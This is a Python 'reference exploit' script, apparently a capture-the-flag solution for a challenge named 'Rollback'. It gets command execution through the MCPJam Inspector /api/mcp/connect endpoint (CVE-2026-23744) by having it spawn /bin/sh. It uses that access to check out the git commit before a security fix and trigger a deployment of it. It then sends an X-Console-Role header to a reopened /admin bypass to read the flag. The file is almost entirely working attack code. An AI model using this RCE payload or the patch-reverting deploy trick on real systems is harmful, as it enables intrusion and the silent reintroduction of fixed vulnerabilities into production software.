#!/usr/bin/env python3
"""
Reference exploit for "Rollback" (stage 2) — chained off "Jam Session".

Chain:
  1. Use the MCPJam Inspector RCE (CVE-2026-23744, /api/mcp/connect) as a
     foothold to run commands as `appuser` on the box.
  2. `appuser` owns the operator working checkout of the MCPJam
     Console at /opt/console/staging. Its latest commit *patched* an auth
     bypass on /admin (it stopped trusting the X-Console-Role header). Revert
     the checkout to the commit right before that fix.
  3. Trigger devops-cd (write to /opt/console/deploy.trigger) so it picks up
     the reverted commit. It only promotes commits that also exist in its
     vetted release mirror, so a real historical commit like this one goes
     through, re-opening the bypass. Hit /admin with the header to read the
     reactor override code — the flag.

The flag comes straight back in the /admin response (no listener needed).

Usage:
    ./solve.py http://<host>:6274
"""

import argparse
import json
import sys
import time
import urllib.request

# Roll the console working checkout back to the commit *before* the security
# fix, then trigger devops-cd so it actually ships that revert. We locate the
# fix by its message rather than a fixed hash so this keeps working if the
# repo is rebuilt.
REVERT_CMD = (
    "cd /opt/console/staging && "
    "git checkout -q main && "
    'git checkout -q "$(git log -i --grep=security --format=%H | head -1)^" && '
    "echo deploy > /opt/console/deploy.trigger"
)


def rce(target, shell_cmd):
    """Run a shell command on the box via the inspector's stdio-spawn RCE."""
    payload = {
        "serverId": "maintenance",
        "serverConfig": {"command": "/bin/sh", "args": ["-c", shell_cmd], "env": {}},
    }
    req = urllib.request.Request(
        target.rstrip("/") + "/api/mcp/connect",
        data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        urllib.request.urlopen(req, timeout=10).read()
    except urllib.error.HTTPError:
        pass  # a failed MCP handshake (HTTP 500) is expected; the command ran


def try_admin(target):
    """Hit /admin with the (once-patched) bypass header; return the flag or None."""
    req = urllib.request.Request(
        target.rstrip("/") + "/admin",
        headers={"X-Console-Role": "operator"},
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            data = json.loads(r.read().decode())
            return data.get("reactor_override_code")
    except urllib.error.HTTPError:
        return None
    except Exception:
        return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("target", nargs="?", default="http://127.0.0.1:6274")
    args = ap.parse_args()

    print("[*] confirming /admin is locked on the patched version")
    if try_admin(args.target):
        print("[!] /admin already open — instance not at the patched version?")
    print("[*] reverting the console checkout to the pre-patch commit via RCE")
    rce(args.target, REVERT_CMD)

    print("[*] waiting for the console to reload the vulnerable version")
    for _ in range(20):
        flag = try_admin(args.target)
        if flag:
            print(f"[+] FLAG: {flag}")
            return 0
        time.sleep(1)

    print("[-] /admin never opened — check the foothold and the revert command")
    return 1


if __name__ == "__main__":
    sys.exit(main())
